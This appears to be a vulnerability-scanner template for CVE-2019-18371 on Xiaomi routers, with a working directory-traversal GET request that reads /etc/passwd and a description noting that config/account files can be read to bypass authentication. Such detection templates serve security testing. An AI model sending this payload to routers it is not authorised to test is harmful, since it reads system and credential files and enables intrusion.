id: CVE-2019-18371

info:
  name: Xiaomi series routers remote command execution
  author: ritikchaddha
  severity: high
  description: An issue was discovered on Xiaomi Mi WiFi R3G devices before 2.28.23-stable. There is a directory traversal vulnerability to read arbitrary files via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.
  reference: |
    - https://ultramangaia.github.io/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html
    - https://nvd.nist.gov/vuln/detail/CVE-2019-18371

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api-third-party/download/extdisks../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
